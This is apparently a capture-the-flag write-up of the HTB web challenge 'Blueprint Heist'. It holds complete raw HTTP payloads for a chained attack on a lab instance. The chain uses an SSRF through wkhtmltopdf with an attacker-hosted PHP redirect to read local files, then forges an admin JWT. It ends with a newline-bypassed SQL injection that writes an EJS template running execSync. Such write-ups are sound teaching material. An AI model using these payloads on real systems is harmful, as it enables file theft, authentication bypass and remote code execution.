![image](https://github.com/blog-tamilctf/blog-tamilctf.github.io/assets/56404692/c2bf24f1-51a8-498b-b795-22f3d9cb67d5)---
title: Blueprint Heist
author: 0xgame0v3r
date: 2024-05-23
categories: [HTB]
tags: [sqli,ssrf,graphql,jwt manipulation,ssti]
---

## Blueprint Heist

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/1.jpeg?raw=true" height=400px>

- [Challenge source file](https://github.com/kabilan1290/WebCTF/blob/master/HTB2024/BlueprintHeist/web_blueprint_heist.zip)

### Initial Analysis:

- The challenge is placed in a medium web category, the first thing i noticed was routes, there were two routes `internal` and `public`.

#### public route:
```
-----public.js-----
const express = require("express");
const router = express.Router();

const { authMiddleware, generateGuestToken } = require("../controllers/authController")
const { convertPdf } = require("../controllers/downloadController")

router.get("/", (req, res) => {
    res.render("index");
})

router.get("/report/progress", (req, res) => {
    res.render("reports/progress-report")
})

router.get("/report/enviromental-impact", (req, res) => {
    res.render("reports/enviromental-report")
})

router.get("/getToken", (req, res, next) => {
    generateGuestToken(req, res, next)
});

router.post("/download", authMiddleware("guest"), (req, res, next) => {
    convertPdf(req, res, next)
})

module.exports = router;
```

- `/report/progress` and `/report/enviromental-impact` is not much of an use,the `/getToken` endpoint seems to generate a guest token and `/download` endpoint uses `authMiddleware("guest")` and convert some PDF we will look this soon.

```
-----authController.js-----
const jwt = require('jsonwebtoken');

const { generateError } = require('../controllers/errorController');
const { checkInternal } = require("../utils/security")

const dotenv = require('dotenv');
dotenv.config();

const secret = process.env.secret

function verifyToken(token) {
    try {
        const decoded = jwt.verify(token, secret);
        return decoded.role;
    } catch (error) {
        return null
    }
}

const authMiddleware = (requiredRole) => {
    return (req, res, next) => {
        const token = req.query.token;

        if (!token) {
            return next(generateError(401, "Access denied. Token is required."));
        }

        const role = verifyToken(token);

        if (!role) {
            return next(generateError(401, "Invalid or expired token."));
        }

        if (requiredRole === "admin" && role !== "admin") {
            return next(generateError(401, "Unauthorized."));
        } else if (requiredRole === "admin" && role === "admin") {
            if (!checkInternal(req)) {
                return next(generateError(403, "Only available for internal users!"));
            }
        }

        next();
    };
};

function generateGuestToken(req, res, next) {
    const payload = {
        role: 'user'
    };

    jwt.sign(payload, secret, (err, token) => {
        if (err) {
            next(generateError(500, "Failed to generate token."));;
        } else {
            res.send(token);
        }
    });
}

module.exports = {authMiddleware, generateGuestToken}
```

- `const secret = process.env.secret` - importing secret from env file and uses it for jwt sign and verify.
- When we call the `/getToken` endpoint, it uses the `generateGuestToken` to create a JWT for role user.
- `authMiddleware ` - verifies the role specified in jwt and also there is additional check to verify if the user is admin `requiredRole === "admin" && role === "admin"` and then it checks `checkInternal(req)`

```
----security.js-----
function checkInternal(req) {
    const address = req.socket.remoteAddress.replace(/^.*:/, '')
    return address === "127.0.0.1"
}
```

- `checkInternal(req)` seems to require the request to be orginating from 127.0.0.1.


#### internal route:

```
const express = require("express");
const router = express.Router();

const { authMiddleware } = require("../controllers/authController")

const schema = require("../schemas/schema");
const pool = require("../utils/database")
const { createHandler } = require("graphql-http/lib/use/express");


router.get("/admin", authMiddleware("admin"), (req, res) => {
    res.render("admin")
})

router.all("/graphql", authMiddleware("admin"), (req, res, next) => {
    createHandler({ schema, context: { pool } })(req, res, next); 
});

module.exports = router;
```

- `/admin` and `/graphql` needs admin JWT authentication.

#### Initial attack with gathered information

- We start with using the `/getToken` endpoint to generate a user jwt token and supply in `router.post("/download", authMiddleware("guest")` download endpoint.

`$curl http://94.237.62.237:43315/getToken 
/>>>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjI5OTY1M30.s54nJAARbBoidYio4dz7YsrsDrLfekrGaQ4DC_n1BY8`

- We have the user token and lets inspect the download endpoint.

```
const { generateError } = require('./errorController');
const { isUrl } = require("../utils/security")
const crypto = require('crypto');
const wkhtmltopdf = require('wkhtmltopdf');

async function convertPdf(req, res, next) {
    try {
        const { url } = req.body;

        if (!isUrl(url)) {
            return next(generateError(400, "Invalid URL"));
        }

        const pdfPath = await generatePdf(url);
        res.sendFile(pdfPath, {root: "."});

    } catch (error) {
        return next(generateError(500, error.message));
    }
}

async function generatePdf(urls) {
    const pdfFilename = generateRandomFilename();
    const pdfPath = `uploads/${pdfFilename}`;

    try {
        await generatePdfFromUrl(urls, pdfPath);
        return pdfPath;
    } catch (error) {
        throw new Error(`Error generating PDF: ${error.stack}`);
    }
}

async function generatePdfFromUrl(url, pdfPath) {
    return new Promise((resolve, reject) => {
        wkhtmltopdf(url, { output: pdfPath }, (err) => {
            if (err) {
                console.log(err)
                reject(err);
            } else {
                resolve();
            }
        });
    });
}

function generateRandomFilename() {
    const randomString = crypto.randomBytes(16).toString('hex');
    return `${randomString}.pdf`;
}

module.exports = { convertPdf };
```

- It gets `const { url } = req.body;` url from the POST body and convert it to PDF using `wkhtmltopdf` ! hmmm.....interesting
- I tried `https://google.com` and its contents are converted into pdf.

```
POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=https://google.com
```
- While trying this, i got stucked in a rabbit hole out of nowhere.

#### The rabbithole out of nowhere:

- while i looking through the files,i found `.env` file have been provided to us!

```
DB_HOST=127.0.0.1
DB_USER=root
DB_PASSWORD=D4T4b4s3Secr3tP4ssw0rd1ss0L0ngOmG!
DB_NAME=construction
DB_PORT=3306
secret=IM_Sup3r_K3y_pl3ase_b3_c4r3ful?
```

- The DB password and secret seemed valid, so i ceased my progress and went on creating admin JWT with the found secret.
- I tried to verify my crafted admin token and found it was `invalid or expired token.`

`GET /admin?token=<token>`

- Trying multiple things for a while,then i thought of verifying the guest token locally with the secret ! IT FAILEDDDDD! 

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/node.jpeg?raw=true">

- It was not the legit secret ! ahhh getting back to my old progress.

#### Getting back to the `/download` endpoint:

- Upon analysing the `wkhtmltopdf` version through produced pdf `wkhtmltopdf 0.12.5`,there is an SSRF vulnerability and we can read local files with it.

- Exploit : https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/
- We need to host a php file `<?php header('location:file://'.$_REQUEST['x']); ?>
` and call it the post url to trigger the ssrf.
- `url=http://ngrok_url/test.php?x=/etc/passwd`

- The idea is to read the real secret inside `/app/.env` through the ssrf and forge the admin token for further exploitation.

```
POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://ngrok_url/test.php?x=/app/.env
```

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/node.jpeg?raw=true" height=400px>

- Okay! we found the real secret key this time :D
- Crafted the admin token and supplied to the endpoint `admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk`

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/internal.jpg?raw=true" height=400px>

- We have a valid admin token, now we need to bypass the `checkInternal(req)` function.

#### More SSRF:

- Since we have an ssrf within the url param and we can use that to call the internal endpoint? and it will satisfy the `checkInternal(req)`.

- By going through the source file,the application was exposed on 1337 port and binded on 0.0.0.0

```
const port = 1337;
	app.listen(port, '0.0.0.0', ())
```

- We can supply `http://0.0.0.0:1337/admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk` in the url to see the response.

```
POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://0.0.0.0:1337/admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk
```

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/adminaccess.jpg?raw=true" height=600px>

- We have the admin token and way to make internal requests and hence now we can start checking the internal routes for further escalation.

#### Graphql and SQLI??

- The internal route has a graphql endpoint `router.all("/graphql", authMiddleware("admin")` and reviewing the source reveals a potential sql injection.

```
------schema.js---------
const { GraphQLObjectType, GraphQLSchema, GraphQLString, GraphQLList } = require('graphql');
const UserType = require("../models/users")
const { detectSqli } = require("../utils/security")
const { generateError } = require('../controllers/errorController');

const RootQueryType = new GraphQLObjectType({
  name: 'Query',
  fields: {
    getAllData: {
      type: new GraphQLList(UserType),
      resolve: async(parent, args, { pool }) => {
        let data;
        const connection = await pool.getConnection();
        try {
            data = await connection.query("SELECT * FROM users").then(rows => rows[0]);
        } catch (error) {
            generateError(500, error)
        } finally {
            connection.release()
        }
        return data;
      }
    },
    getDataByName: {
      type: new GraphQLList(UserType),
      args: {
        name: { type: GraphQLString }
      },
      resolve: async(parent, args, { pool }) => {
        let data;
        const connection = await pool.getConnection();
        console.log(args.name)
        if (detectSqli(args.name)) {
          return generateError(400, "Username must only contain letters, numbers, and spaces.")
        }
        try {
            data = await connection.query(`SELECT * FROM users WHERE name like '%${args.name}%'`).then(rows => rows[0]);
        } catch (error) {
            return generateError(500, error)
        } finally {
            connection.release()
        }
        return data;
      }
    }
  }
});

const schema = new GraphQLSchema({
  query: RootQueryType
});

module.exports = schema;
```

- There were only two queries `getAllData` which will list all user data and `getDataByName` where we can supply a name and it will search for the username.

```
{getAllData{name department isPresent}}

{getDataByName(name:"John"){name department isPresent}}
```

- Within the admin endpoint, there is option to search username and get all users through graphql which was executing in POST request.

```

function getToken() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('token')
  }

  async function fetchAbsence() {
    const token = getToken();

    const url = `/graphql?token=${token}`;

    const query = `{
        getAllData {
            name
            department
            isPresent
        }
    }`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ query }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.errors) {
            console.error("Error fetching data:", data.errors);
        } else {
            const absenceContainer = document.getElementById('absenceContainer');
            absenceContainer.innerHTML = '';

            data.data.getAllData.forEach(({ name, department, isPresent }) => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${name}</td>
                    <td>${department}</td>
                    <td>${isPresent ? "Present" : "Absent"}</td>
                `;
                absenceContainer.appendChild(row);
            });
        }
    })
    .catch(error => {
        console.error("Error fetching data:", error);
    });
}

document.getElementById('fetchUserForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const token = getToken()

    const username = document.getElementById('username').value;
    fetch(`/graphql?token=${token}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            query: `{
                getDataByName(name: "${username}") {
                    name
                    department
                    isPresent
                }
            }`
        })
    })
    .then(response => response.json())
    .then(data => {
        const absenceContainer = document.getElementById('absenceContainer');
        absenceContainer.innerHTML = '';
        if (data.errors) {
            console.error('Error fetching user data:', data.errors);
        } else if (data.data.getDataByName) {
            data.data.getDataByName.forEach(({ name, department, isPresent }) => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${name}</td>
                    <td>${department}</td>
                    <td>${isPresent ? "Present" : "Absent"}</td>
                `;
                absenceContainer.appendChild(row);
            });
        } else {
            console.log('No user found with the provided username:', username);
        }
    })
    .catch(error => {
        console.error('Error fetching user data:', error);
    });
});

fetchAbsence()
```
- We know graphql supports get method too and we can try that to execute a query.

```
POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://0.0.0.0:1337/graphql?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk%26query={getAllData{name%20department%20isPresent}}
```
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/graphql.png?raw=true" height=400px>

- Now we can try the graphql search query to exploit the sqli injection possibly?
- At glance seemed like a easy SQLI `SELECT * FROM users WHERE name like '%${args.name}%'` but not :(

```
------schema.js---------
if (detectSqli(args.name)) {
          return generateError(400, "Username must only contain letters, numbers, and spaces.")
        }


------security.js---------
function detectSqli (query) {
    const pattern = /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/
    return pattern.test(query)
}
```

- The `detectSqli` function blocks all the possible special characters in our graphql query before appending to the sql query.
- Got stuck at this point for a while,i thought there is no way to bypass the regex and started to do lot of workarounds.
- Maybe gopher to sql? we have db username and pass [FAILED]
- Tried reading lot of system files through ssrf [NOTHING INTERESTING]
- Then i tried to validate the regex once again! [best decision]

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/nl.jpg?raw=true">

- !!!! New line injection , we found our regex bypass!
- With that in hand, i tried to inject the newline sql injection to break the query and noticed whether any error appeared.[ `{getDataByName(name:"John\n '"){name%20department%20isPresent}}`]

```
POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://0.0.0.0:1337/graphql?query={getDataByName(name:"John\n '"){name%20department%20isPresent}}%26token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk
```

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/sql.jpg?raw=true">

- We got through this ! now we need to somehow escalate this sqli to read the flag.
- The flag.txt was compiled as a binary named `/readflag`
- We need to call the binary through sqli?

#### SQLI write and EJS template injection:

- We have the db file given,we have 4 columns and 2 columns `name,department` are TEXT,hence it will reflect.

```
CREATE TABLE construction.users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    name TEXT,
    department TEXT,
    isPresent BOOLEAN
);
```
- Forming the SQL query `' UNION SELECT 1,user(),database(),4-- -`

```
POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://0.0.0.0:1337/graphql?query={getDataByName(name:"John\n%20'%20UNION%20SELECT%201,user(),database(),4--%20-"){name%20department%20isPresent}}%26token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk
```

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/sqli.jpeg?raw=true" height=400px>

- Noticed we can do `load_file` and `outfile` with the SQLI.

- `LOAD FILE:` Reads the file from the server and returns to the user on the screen, It will show the file contents as a string on the screen.

- `OUTFILE:` it writes the resulting rows to a file, and allows the use of column and row terminators to specify a particular output format. the file is created on the server host, so you must have the file privilege to use this syntax. File to be written cannot be an existing file, which among other things prevents files (such as “/etc/passwd”) and database tables from being destroyed.

ref : https://blog.certcube.com/advance-sql-injections-with-loadfile-and-outfile/

- Then i tried loading the `/readflag` into the injection point, below were the result - printed as binary !!

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/load.jpeg?raw=true" height=600px>

- We know now the attack point is to write a file and maybe get a reverse shell to `/readflag` or even print the result of `/readflag` somehow.

- Got stuck here for sometime to identify where we need write our file to make the server display flag.

- Then `malformx`(teammate) gave an idea to write our payload as ejs and make the server render it! but how?

```
------errorController.js--------
const fs = require('fs');
const path = require('path');

function generateError(status, message) {
    const err = new Error(message);
    err.status = status;
    return err;
};

const renderError = (err, req, res) => {
    res.status(err.status);
    const templateDir = __dirname + '/../views/errors';
    const errorTemplate = (err.status >= 400 && err.status < 600) ? err.status : "error"
    let templatePath = path.join(templateDir, `${errorTemplate}.ejs`);

    if (!fs.existsSync(templatePath)) {
        templatePath = path.join(templateDir, `error.ejs`);
    }
    console.log(templatePath)
    res.render(templatePath, { error: err.message }, (renderErr, html) => {
        res.send(html);
    });
};

module.exports = { generateError, renderError }
```

- Here depend on the error status code, a template file is rendered from  `/views/errors/{errorcode}.ejs` and if it does not found returns to  `error.ejs`.

- We cant override any exisiting files ,maybe we should prdouce a non generic error code and write a file within `/views/errors/{ourerrorcode}.ejs` to render our flag?

- Quickly noticing the file structure.

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/missing.png?raw=true" height=200px>

- wewww! there is no 404 template and it easy to trigger a 404 error, so our idea is to write a 404.ejs using SQLi outfile and render a template to read the flag.

- The payload to write `<p><%=process.mainModule.require('child_process').execSync('/readflag') %></p>` as `404.ejs` and into the directory `/app/views/errors/404.ejs`


#### Payload:
```
{getDataByName(name:"admin\n' union select 1,'<p><%= process.mainModule.require(\"child_process\").execSync(\"/readflag\") %></p>',2,3 into outfile '/app/views/errors/404.ejs'-- "){name
department
isPresent
}}
```

- We need to send the above payload in the request.

```
POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://0.0.0.0:1337/graphql?query=%257bgetDataByName(name%253a%2522admin%255cn'%2520union%2520select%25201%252c'%253cp%253e%253c%2525%253d%2520process.mainModule.require(%255c%2522child_process%255c%2522).execSync(%255c%2522%252freadflag%255c%2522)%2520%2525%253e%253c%252fp%253e'%252c2%252c3%2520into%2520outfile%2520'%252fapp%252fviews%252ferrors%252f404.ejs'--%2520%2522)%257bname%250adepartment%250aisPresent%250a%257d%257d%26token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk
```

- Now we just need to trigger the 404 error by calling not existing files in the server to retrieve the flag.

<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/flag.jpeg?raw=true" height=200px>

- We finally cracked the challenge! That was quite a bit of chaining.
